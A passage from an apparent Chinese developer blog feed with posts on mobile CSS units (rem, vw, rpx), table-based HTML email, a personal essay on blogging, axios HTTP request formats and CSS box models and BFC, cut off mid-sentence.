class="number">0</span>];</span><br><span class="line">viewPort.setAttribute(<span class="string">'name'</span>, <span class="string">'viewport'</span>);</span><br><span class="line">viewPort.setAttribute(<span class="string">'content'</span>, <span class="string">'initial-scale='</span> + <span class="number">1</span> / dpr + <span class="string">', maximum-scale='</span> + <span class="number">1</span> / dpr + <span class="string">', minimum-scale='</span> + <span class="number">1</span> / dpr + <span class="string">', user-scalable=no'</span>);</span><br><span class="line">head.insertBefore(viewPort, <span class="built_in">document</span>.getElementsByTagName(<span class="string">'meta'</span>)[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任意浏览器的默认font-size=16px; html&#123;font-size:6.25% // 10px;&#125;则=&gt;1rem=6.25%=10px;</span></span><br><span class="line"><span class="comment">// 按照750*1334来切图则 1rem=&gt;37.5px 设置好了rem可以直接在css中rem</span></span><br><span class="line"><span class="comment">// pxToRem中rem直接定为37.5px;尺寸都是照这个来的</span></span><br><span class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'html'</span>)[<span class="number">0</span>].style.fontSize = <span class="built_in">window</span>.innerWidth / <span class="number">10</span> + <span class="string">'px'</span>;</span><br></pre></td></tr></table></figure><h3 id="小程序中"><a href="#小程序中" class="headerlink" title="小程序中"></a>小程序中</h3><p>rpx是微信小程序专用尺寸单位，规定屏幕宽为750rpx<br>注：开发微信小程序时设计师可以用 iPhone6 作为视觉稿的标准。<br>建议：设计稿使用设备宽度750px比较容易计算750px的话1rpx=1px，这样的话，设计图上量出来的尺寸是多少px就是多少rpx，至于在不同的设备上实际上要换算成多少个rem就交给小程序自己换算</p><p>像素：</p><p>物理像素：</p><p>设备独立像素</p><p>设备像素比：dpr</p><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>vw，vh，vmin和vmax是基于viewport的长度单位</p><ul><li><p>vw: viewport’s width,1vw等于window.innerWidth的1%</p></li><li><p>vh：viewport’s height，1vh等于window.innerHeihgt的1%</p></li><li><p>vmin: vmin的值是当前vw和vh中较小的值</p></li><li><p>vmax: vmax的值是当前vw和vh中较大的值</p></li></ul><p>针对750px的设计稿，将px值除以75得到vw的值</p><p>尽管在某些Android机型上还存在兼容问题，我们也可以使用Viewport Units Buggyfill，具体见《如何在Vue项目中使用vw实现移动端适配》</p><p>回顾与总结：</p><p>细节与思考：</p><p>面试中常问的.5px的实现，现在你会了吗？</p><p>参考文献：</p><p><a href="http://www.html-js.com/article/4771" target="_blank" rel="noopener">http://www.html-js.com/article/4771</a><br><a href="http://www.alloyteam.com/2016/03/mobile-web-adaptation-tool-rem/" target="_blank" rel="noopener">http://www.alloyteam.com/2016/03/mobile-web-adaptation-tool-rem/</a><br>移动端适配和.5px的由来<a href="http://mp.weixin.qq.com/s/5BpIpM6WAvWaX2Y8IrVETA" target="_blank" rel="noopener">http://mp.weixin.qq.com/s/5BpIpM6WAvWaX2Y8IrVETA</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>邮件中的HTML</title>
      <link href="/2017/07/18/html_in_email/"/>
      <url>/2017/07/18/html_in_email/</url>
      
        <content type="html"><![CDATA[<p>马上要举办iOT大会，突然来了个急需求，要把邀请函做成HTML嵌在邮件里发送给参会嘉宾，心里想这有何难，三下五除二写完发给了小伙伴，真正放在邮件里看都傻眼了。</p><p>outlook客户端里：css统统不生效。</p><p>手机端显示更是惨不忍睹，各种手机表现形式完全不一样。</p><p>真是狠狠打自己的脸。<br><a id="more"></a></p><p>速google了一下，果然这种邮件内嵌html都是有固定的格式要求的，这种HTML Emial能否正常显示完全就取决于邮件客户端，而web技术发展了这么多年，这种邮件中的HTML却丝毫没有发展，各种邮件客户端都特别傲娇，简直可以称得上是面目全非。</p><p>一个准则就是：怎么原始怎么来。</p><p>1.不要再考虑css提取出来的问题，直接全部写在element style里。</p><p>不能使用reset实在太臃肿了，要保持一致性要写很多重复的代码，怀念现代的生活。</p><p>2.不要想flex布局，float布局，绝对定位啦！直接上年轻人都没听过的table布局。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"600"</span> <span class="attr">style</span>=<span class="string">"border-collapse: collapse;"</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">td</span>&gt;</span> Row 1 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">td</span>&gt;</span> Row 2 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">　　<span class="tag">&lt;<span class="name">td</span>&gt;</span> Row 3 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">　<span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>先想好布局分为几部分，写在各个tr里。</p><p>3.图片是唯一可以引用的外部资源。其他的外部资源，比如样式表文件、字体文件、视频文件等，一概不能引用。</p><p>遵循上面3条规则，代码越写φ(≧ω≦*)♪越臃肿了，但是最可怕的是发现，自己根本不懂table！<br><img src="/images/complex_table.png" alt="一个很复杂的表格"></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">align</span>=<span class="string">"center"</span> <span class="attr">border</span>=<span class="string">"1"</span> <span class="attr">cellpadding</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"0"</span> <span class="attr">width</span>=<span class="string">"600"</span> <span class="attr">style</span>=<span class="string">"border-collapse: collapse;"</span>&gt;</span></span><br><span class="line">  　<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    　<span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span> 好 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    　<span class="tag">&lt;<span class="name">td</span>&gt;</span> 复杂<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"5"</span>&gt;</span>嗷嗷嗷！<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">td</span>&gt;</span> 的<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  　<span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span>&gt;</span> 表 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">td</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span> 格 <span class="tag">&lt;/<span class="name">td</span>&gt;</span>　</span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    　<span class="tag">&lt;<span class="name">td</span>&gt;</span> 啊 <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">    　<span class="tag">&lt;<span class="name">td</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span> ! <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure><p>复杂的表格需要用到<code>colspan</code>和<code>rowspan</code>用于单元格的合并。<br>其实想想表格的布局也是一个一个小方块，最古老的时候使用也算是合理。</p>]]></content>
      
      
      
        <tags>
            
            <tag> HTML </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>写博客：程序员的自洽</title>
      <link href="/2017/05/18/blog/"/>
      <url>/2017/05/18/blog/</url>
      
        <content type="html"><![CDATA[<p>去年的时候老是调侃自己，做了程序员之后越来越沉默寡言，朋友圈都发的越来越少，你说也是，谁愿意看一个天天坐在电脑前的程序员枯燥无味的朋友圈呢？而且常常语塞，和产品撕逼占下风，只能靠自己的智商来感化PM。</p><p>想当年高中我也是作文能拿满分的吐槽小能手呢，没想到现在居然混到连话都不会说的地步！</p><p>如何走上写博客的不归路呢？最开始是看毛毛写公众号混饭吃，把她写的文的标题全部过了一遍，总结了一堆套路。</p><blockquote><p>XXX竟然是XXX<br>XXX指南<br>XXX一定不知道这些<br>XXX凭什么XXX<br>XXXX？XXX我只关心XXX<br>XXXX？我才不管<br>XXXX？怎么就XXX<br>XXXX？知道这些就够了</p></blockquote><p>感觉面前有一只咪蒙在咆哮，但是确实写的很引人入胜。</p><p>我学着列出了一堆自己要写的文章标题。</p><blockquote><p>自己都拎不清，凭什么对我的人生指手划脚</p><p>消费升级？要升你升</p><p>人生苦短，数学不及格的我也能学会python吗</p><p>红利期已过？自媒体的车还能搭吗</p><p>有颜有钱，凭什么她就是人生赢家</p><p>PM不给设计图，应该沉塘吗？</p><p>不当饭吃，还要了解社会时事吗</p><p>PM张嘴就来，不是蠢就是坏（这篇是不是很期待，我自己都忍不住想猛戳进去看去）</p><p>看咪蒙就互删？你告诉我到底什么叫有趣的人</p><p>我写的东西没用？去看五年高考三年模拟呗</p></blockquote><p>wow，这一堆标题，写的我热血沸腾啊，倾诉欲马上就来了，想好好写上面的每一篇文章。</p><p>没想到我是这样的狗子。</p><p>我心想我写的再差应该也比80%的程序员要好吧。</p><p>最开始不敢写，害怕别人<strong>知道自己不知道某些事</strong>，</p><p>内向的人怕露怯，所以拼命的学习，自己都看不清自己</p><p>有些很有意思的事，写出来又怕暴露朋友的隐私</p><p>有时候想写的东西发现别人已经写了一万遍了，我现在选择先梳理下写下自己的看法，然后再去 google相关主题，没别人写的好也没关系，说不定小白觉得你的文章好懂。</p><p>只要是别人关心的，一件小事也有意义。</p><p>多输出，才能看清自己。</p><p>博客第一次收到文章评论，激动的觉都睡不着。</p><p>哇，这个技术点很有意思啊，一定要成文分享给大家。</p><p>我开始变成一个乐于分享的人，和同事没啥话说的我也开始变得开朗，生活变得积极向上起来。</p><p>写博客的人和不写博客的人差别太大了，毕竟那些人同样度过了这三年什么也没留下，而我，还记录下来了这么多篇文章，虽然确实有很多废话。</p><p>最初会觉得真的没啥可写，完全是笔记，慢慢的就变成一种习惯，开始乐于思考，从枯燥的生活中找亮点，每天不敲几行记录下就浑身难受，你写的东西说不定就是有人很在意，能够帮别人解决问题。</p><p>其实也受了超哥不少影响，他说工具怎么用都没啥可记录的，必须是源码解析，深入内部才值得记录，反正我记性不好，时不时还是要查查工具应该怎么用，整理好排版，清爽的格式读起来也开心，并不会降低我这一亩三分地的逼格。</p><p>写博客吧，虽然自媒体的红利期已过，但是人生苦短，持之以恒，爱分享的人运气不会太差。</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>「 HTTP 」通过axios来理解http请求</title>
      <link href="/2017/05/18/axios_http/"/>
      <url>/2017/05/18/axios_http/</url>
      
        <content type="html"><![CDATA[<p>刚开始做小程序对接的时候，很多人一上来就问为啥这个接口请求不成功，完全都不知道自己看看HTTP的请求信息，因为 <code>wx.request</code> 没有设置<code>content-type</code>，默认的 <code>content-type</code> 是 <code>application/json</code>。但是我们平常后端接受的一般都是 <code>application/x-www-form-urlencoded</code>。用惯了jQuery的$.ajax今天来说说请求的细节。<br><a id="more"></a></p><h4 id="Request-Payload-amp-FormData"><a href="#Request-Payload-amp-FormData" class="headerlink" title="Request Payload&amp; FormData"></a>Request Payload&amp; FormData</h4><ol><li>Request Payload</li></ol><p>对应content-type：application/json，<strong>axios默认使用的是此content-type</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /some-path HTTP/1.1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Request Payload:</span><br><span class="line">view parsed: &#123; &quot;foo&quot; : &quot;bar&quot;, &quot;name&quot; : &quot;John&quot; &#125;</span><br><span class="line">view source：&#123; &quot;foo&quot; : &quot;bar&quot;, &quot;name&quot; : &quot;John&quot; &#125;</span><br><span class="line">没有viewencode，因为不encode</span><br></pre></td></tr></table></figure><p>content-type：application/json上传数据可以更多样，可以直接传递数组，对象<br><code>{ &quot;foo&quot; : &quot;bar&quot;, &quot;name&quot; : &quot;John&quot;，goods:[&#39;fish&#39;,&#39;beef&#39;] }</code></p><p><strong>后台处理</strong></p><p>对于 Request Payload 请求， 必须加<code>@RequestBody</code>才能将请求正文解析到对应的 bean 中，且只能通过 request.getReader() 来获取请求正文内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/accounts&quot;)</span><br><span class="line">public ResponseEntity&lt;?&gt; createAccount(@RequestBody SysAccount account) &#123;</span><br></pre></td></tr></table></figure><ol><li>FormData</li></ol><p><strong>常见的content-type一般都是application/x-www-form-urlencoded</strong>，这是jQuery默认的content-type</p><p>对应application/x-www-form-urlencoded：正文请求类似get url请求</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /some-path HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">FormData:</span><br><span class="line">view source:foo=bar&amp;name=John</span><br><span class="line">view source中会encode之后直接上送</span><br></pre></td></tr></table></figure><p><strong>后台处理</strong></p><p>对于 Form Data 请求，无需任何注解，springmvc 会自动使用 MessageConverter 将请求参数解析到对应的 bean，且通过 request.getParameter(…) 能获取请求参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@PostMapping(&quot;/accounts&quot;)</span><br><span class="line">public ResponseEntity&lt;?&gt; createAccount(SysAccount account) &#123;</span><br></pre></td></tr></table></figure><p>前端可以通过qs来将request payload转为form data上送</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">'Qs'</span>;</span><br><span class="line"><span class="comment">// axios默认将Content-type设为`application/json`</span></span><br><span class="line">axios.defaults.headers.post[<span class="string">'Content-Type'</span>] = <span class="string">'application/x-www-form-urlencoded'</span>;</span><br><span class="line">axios.post(url, &#123; <span class="attr">data</span>: Qs.stringify(para) &#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">resolve(res);</span><br><span class="line">&#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>Qs.stringify和JSON.stringify的区别</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Qs.stringify( &#123;<span class="attr">name</span>:<span class="string">'hehe'</span>,<span class="attr">age</span>:<span class="number">10</span>&#125;)=&gt; name=hehe&amp;age=<span class="number">10</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify( &#123;<span class="attr">name</span>:<span class="string">'hehe'</span>,<span class="attr">age</span>:<span class="number">10</span>&#125;)=&gt;<span class="string">"&#123;"</span>a<span class="string">":"</span>hehe<span class="string">","</span>age<span class="string">":10&#125;"</span></span><br></pre></td></tr></table></figure><h4 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h4><p>需要在header中设置<code>{ &#39;Content-Type&#39;: &#39;multipart/form-data&#39; }</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">POST /some-path HTTP/1.1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP1hWgP9UXLkUFJEd</span><br><span class="line"></span><br><span class="line">Request Payload</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryP1hWgP9UXLkUFJEd</span><br><span class="line">Content-Disposition: form-data; name=&quot;id&quot;</span><br><span class="line"></span><br><span class="line">12345</span><br><span class="line">------WebKitFormBoundaryP1hWgP9UXLkUFJEd # 通过boundary来分隔各个请求参数</span><br><span class="line">Content-Disposition: form-data; name=&quot;ips&quot;</span><br><span class="line"></span><br><span class="line">[&quot;1.2.3.1&quot;,&quot;1.2.3.4&quot;] //注意在formData中无法上送实际list，都会被转为string</span><br><span class="line">------WebKitFormBoundaryP1hWgP9UXLkUFJEd</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;my.file&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryP1hWgP9UXLkUFJEd--</span><br></pre></td></tr></table></figure><p>调用示例：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> formData = <span class="keyword">new</span> FormData();</span><br><span class="line">formData.append(<span class="string">'file'</span>, file);</span><br><span class="line">formData.append(<span class="string">'id'</span>, id);</span><br><span class="line">formData.append(<span class="string">'ips'</span>, <span class="built_in">JSON</span>.stringify([<span class="string">'1.2.1.1'</span>,<span class="string">'2.1.2.1'</span>]));<span class="comment">//后台还是需要配合解析</span></span><br><span class="line">axios(&#123;</span><br><span class="line">method: <span class="string">'post'</span>,</span><br><span class="line">url,</span><br><span class="line">data: formData,</span><br><span class="line">headers: &#123; <span class="string">'Content-Type'</span>: <span class="string">'multipart/form-data'</span> &#125;,<span class="comment">//需要设置Content-Type</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">&#125;).catch(<span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="DELETE的使用"><a href="#DELETE的使用" class="headerlink" title="DELETE的使用"></a>DELETE的使用</h4><p>可以看到axios中传参config中可以使用data和params</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// `params` are the URL parameters to be sent with the request</span></span><br><span class="line"><span class="comment">// Must be a plain object or a URLSearchParams object</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line">params: &#123;</span><br><span class="line">ID: <span class="number">12345</span></span><br><span class="line">&#125;,</span><br><span class="line"><span class="comment">// `data` is the data to be sent as the request body</span></span><br><span class="line"><span class="comment">// Only applicable for request methods 'PUT', 'POST', and 'PATCH'</span></span><br><span class="line"><span class="comment">// When no `transformRequest` is set, must be of one of the following types:</span></span><br><span class="line"><span class="comment">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span></span><br><span class="line"><span class="comment">// - Browser only: FormData, File, Blob</span></span><br><span class="line"><span class="comment">// - Node only: Stream, Buffer</span></span><br><span class="line"><span class="comment">// data传参是在request body中，是向服务器发送资源，只支持PUT，POST，PATCH。因为GET只支持在params中传参，显示时是Query String Parameters</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// DELETE也只支持在params的原因是一般都是只上送个id来删除，没有必要在request body中传递，直接在Query String Parameters中传递即可</span></span><br><span class="line">data: &#123;</span><br><span class="line">firstName: <span class="string">'Fred'</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>浏览器中显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /some-path HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">---------------Query String Parameters-----------------</span><br><span class="line">拼接在url后面的就是此种</span><br><span class="line">view source:</span><br><span class="line">id:12345</span><br><span class="line">view parsed:</span><br><span class="line">id=12345</span><br><span class="line">-----------FormData-----------------</span><br><span class="line">view parsed:</span><br><span class="line">foo:bar</span><br><span class="line">name:Eva</span><br><span class="line">view source：</span><br><span class="line">foo=bar&amp;name=Eva</span><br></pre></td></tr></table></figure><p>GET请求对应Query String Parameters，是没有对应的Content-type的</p><p>或对应Content-type：text/plain</p><p>在request body中传递是对应Request Payload或FormData</p><h4 id="支持CSRF攻击"><a href="#支持CSRF攻击" class="headerlink" title="支持CSRF攻击"></a>支持CSRF攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 设置CSRFToken</span><br><span class="line">axios.defaults.xsrfCookieName = &apos;csrftoken&apos;;</span><br><span class="line">axios.defaults.xsrfHeaderName = &apos;X-CSRFToken&apos;;</span><br></pre></td></tr></table></figure><h4 id="关于urlencode"><a href="#关于urlencode" class="headerlink" title="关于urlencode"></a>关于urlencode</h4><p>前文提到FormData对应的Content-type为application/x-www-form-urlencoded以及GET请求对应的Query String Parameters，此类请求中上送参数都会被浏览器自动encode后上送</p><p>但是需要注意的是有时候浏览器encode的并不是我们想要的，比如下面这个陈年老坑</p><p><a href="https://mi.com?id=1+2+3" target="_blank" rel="noopener">https://mi.com?id=1+2+3</a><br>实际后台收到的参数是id=1 2 3,上送时+变成了空格，所以需要前端<code>encodeURIComponent(&#39;1+2+3&#39;)=&amp;gt;1%2B2%2B3</code>再上送<br>实际上会encode成<a href="https://mi.com?id=1" target="_blank" rel="noopener">https://mi.com?id=1</a> 2 3，参数还是id=1 2 3</p><p>总之遇上+号时，前端最好encodeURIComponent后上送</p><p>参考文献：<br><a href="https://fed.renren.com/2018/02/03/http-request/" target="_blank" rel="noopener">https://fed.renren.com/2018/02/03/http-request/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> HTTP </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>「 CSS 」css布局规则和你不知道的BFC</title>
      <link href="/2017/04/18/css_layout_bfc/"/>
      <url>/2017/04/18/css_layout_bfc/</url>
      
        <content type="html"><![CDATA[<p>BFC的文章很多，但是大多翻译腔读起来佶屈聱牙，而且有些例子根本不符合场景。今天从一些常见基本问题入手，来全面的分析css布局的规则。大部分内容来自MDN及自己的理解。</p><a id="more"></a><h3 id="0-什么是盒模型？"><a href="#0-什么是盒模型？" class="headerlink" title="0.什么是盒模型？"></a>0.什么是盒模型？</h3><p>一个元素如何在页面中找准自己的位置，首先要知道定位，然后再根据padding，margin，border及内容来决定尺寸。</p><p>一个大盒子里放了小盒子，小盒子的定位首先是根据大盒子来的。外部发生什么只影响大盒子，但不会影响小盒子。</p><p>标准盒子模型：宽度=内容的宽度（content）+ border + padding + margin<br>低版本IE（&lt;6）盒子模型：宽度=内容宽度（content+border+padding）+ margin</p><p>box-sizing属性用来确定控制元素盒模型的解析模式，默认是content-box标准盒模型，定义了宽高是否包含border和padding。</p><p>(IE&gt;=8需要加上前缀)box-sizing:border-box</p><p>box-sizing:border-box没有广泛使用的原因？<br>IE6，7的标准模式下没有box-sizing，要使用box-sizing必须使用quirk mode<br>有了calc()之后，box-sizing用来避免无意义标签的不可替代性消失了，而且还有些bug</p><p>比如FF和IE在getComputedStyle得到的width/height是按照标准模式计算出来的），以及混合多种box model在开发中的理解成本（要随时记得width/height的表现取决于box-sizing的计算值——其实left/top也有类似的问题，调试的时候你得确定position的计算值），使用box-sizing的好处就不多了。<br>参考：<a href="https://www.zhihu.com/question/20691294" target="_blank" rel="noopener">https://www.zhihu.com/question/20691294</a></p><p>房子是一砖一瓦搭起来的，这一个个砖块就是一个个盒子。所以说我们就是搬砖工？</p><h3 id="1-盒（box）和元素（element）有什么关系？"><a href="#1-盒（box）和元素（element）有什么关系？" class="headerlink" title="1.盒（box）和元素（element）有什么关系？"></a>1.盒（box）和元素（element）有什么关系？</h3><p>看MDN上有时候提到块级盒，有时候又称为块级元素，本来简单的以为这两者是一致的，大多数情况下每个元素都可以被看作是一个盒子。但实际上两者并不是一一对应的关系。</p><p>多个元素可以组成一个盒。比较好理解，在css世界中本来就是大盒嵌套小盒。</p><p>一个元素也可以生成多个盒。主要的两种情况：</p><ul><li><p>比如<code>li</code>，一个元素会生成2个盒，前面的项目符号也是一个盒，主盒是<code>li</code>中的内容。</p></li><li><p><strong>匿名盒</strong>（anonymous box），<code>&lt;div&gt;Some inline text &lt;p&gt;followed by a paragraph&lt;/p&gt; followed by more inline text.&lt;/div&gt;</code></p></li></ul><p><code>Some inline text</code>这部分不能被选择器精确的选中，所有的属性都是<code>inherit</code>，整个<code>div</code>会生成一个盒，<code>Some inline text</code>这部分也会生成一个独立的盒，称作匿名盒。所以这种情况下一个元素生成了多个盒。匿名盒所有可继承的 CSS 属性值都为 <code>inherit</code> ，而所有不可继承的 CSS 属性值都为 <code>initial</code>。</p><p>元素只是对于HTML来说的，我们谈到<strong>布局（layout）时，都是在说盒的布局</strong>。可以说盒是css世界的基础，是css世界的最小单位。</p><p>大部分情况下盒和元素的关系是对应的，我们说属性时通常都是元素的属性，<del>盒的类型由最外层元素的</del><code>display</code><del>属性决定</del>。</p><p>盒主要有块级盒、行内级盒、匿名盒以及一些实验性的盒（未来可能添加到规范中）。我们主要分析块级盒和行内级盒。</p><h3 id="2-何为行内（inline），何为块（block），各有什么特性？"><a href="#2-何为行内（inline），何为块（block），各有什么特性？" class="headerlink" title="2.何为行内（inline），何为块（block），各有什么特性？"></a><strong>2.何为行内（inline），何为块（block），各有什么特性？</strong></h3><h4 id="块级"><a href="#块级" class="headerlink" title="块级"></a>块级</h4><ul><li><p><strong>块级元素 </strong>(block-level element)：<code>display</code>属性为<code>block</code>、<code>list-item</code>、<code>table</code> 的元素。主要对应的标签有:<code>div</code>，<code>p</code>，<code>h1</code>等。</p></li><li><p><strong>块级盒 </strong>(block-level box)：最外层元素是块级元素生成，对内部的子元素没有要求，子元素可以是行内元素。这个概念用来解释布局。【？？？又说内部元素要么都是块级盒，要么都是行内盒？？？】</p></li><li><p><strong>块容器盒</strong>（block containing box）：只是强调当前盒有包含其他的盒。</p></li><li><p><strong>块盒</strong>（block box）：既是块级盒又是块容器盒。</p></li></ul><h4 id="行内"><a href="#行内" class="headerlink" title="行内"></a>行内</h4><ul><li><p><strong>行内级元素</strong>（inline-level element）：<code>display</code>属性 为 <code>inline</code>、<code>inline-block</code>、<code>inline-table</code> 的元素。</p></li><li><p><strong>行内级盒</strong>（inline-level 